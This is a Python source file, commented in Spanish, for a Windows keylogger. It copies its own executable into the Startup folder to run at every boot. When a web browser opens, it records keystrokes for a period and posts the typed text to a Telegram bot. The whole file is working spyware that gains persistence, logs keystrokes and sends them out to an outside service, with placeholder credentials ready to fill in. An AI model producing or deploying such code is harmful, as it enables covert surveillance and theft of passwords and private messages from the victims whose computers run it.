import keyboard
import threading
import time
import requests
import os
import shutil
import psutil
from pathlib import Path

####################################### CREDENCIALES Y GLOBALES

TOKEN = "TOKEN_TELEGRAM_BOT"
CHAT_ID = "CHAT_ID"
intervalo_minutos = 15
capturando = False
previous_state = False
browsers = ["chrome.exe", "firefox.exe", "msedge.exe", "brave.exe"] # Lista de nombres de navegadores comunes (Windows)

####################################### EJECUTAR AL ARRANCAR LA PC
def agregar_a_inicio():
    nombre_archivo = os.path.basename(__file__)
    
    # Si es un ejecutable, __file__ tendrá .exe
    if not nombre_archivo.endswith(".exe"):
        print("AUN NO ES UN EJECUTABLE, YA NO DEBERIAS VER ESTO DESPUES")
        return  # Solo ejecutar si es el .exe final

    ruta_origen = Path(__file__)
    ruta_destino = Path(os.getenv('APPDATA')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / nombre_archivo

    if not ruta_destino.exists():
        try:
            shutil.copy(ruta_origen, ruta_destino)
            print(f"[OK] Ejecutable copiado al inicio: {ruta_destino}")
        except Exception as e:
            print(f"[ERROR] No se pudo copiar al inicio: {e}")

############################################# NAVEGADOR

def is_browser_open():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() in browsers:
            return True
    return False

########################################### HILOS Y TECLAS

def enviar_telegram(mensaje):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    data = {
        'chat_id': CHAT_ID,
        'text': mensaje
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Error al enviar a Telegram:", e)

def capturar_teclas():
    global capturando
    if capturando:
        return
    capturando = True
    print("[INFO] Capturando teclas...")
    teclas_capturadas = []
    def registrar_tecla(e):
        name = e.name
        if len(name) == 1:  # letra, número, símbolo
            teclas_capturadas.append(name)
        elif name == "space":
            teclas_capturadas.append(" ")
        elif name == "enter":
            teclas_capturadas.append("\n")
        elif name == "backspace":
            if teclas_capturadas:
                teclas_capturadas.pop()  # Elimina el último carácter

    keyboard.on_press(registrar_tecla)
    time.sleep(120)  # o 900 para 15 min
    keyboard.unhook_all()
    texto = "".join(teclas_capturadas)
    if texto.strip():
        enviar_telegram("Teclas presionadas:\n" + texto)
        print("[INFO] FIN. TECLAS CAPTURADAS Y MENSAJE ENVIADO")
    capturando = False

def planificador():
    global previous_state
    while True:
        current_state = is_browser_open()
        if current_state and not previous_state:
            print("[+] Navegador abierto")
            capturar_teclas()
            time.sleep(intervalo_minutos * 60)
        elif not current_state and previous_state:
            print("[-] Navegador cerrado")
        previous_state = current_state

if __name__ == "__main__":     
    os.system("color 0A")
    print("PROGRAMA INICIADO")
    threading.Thread(target=planificador, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Finalizado por el usuario.")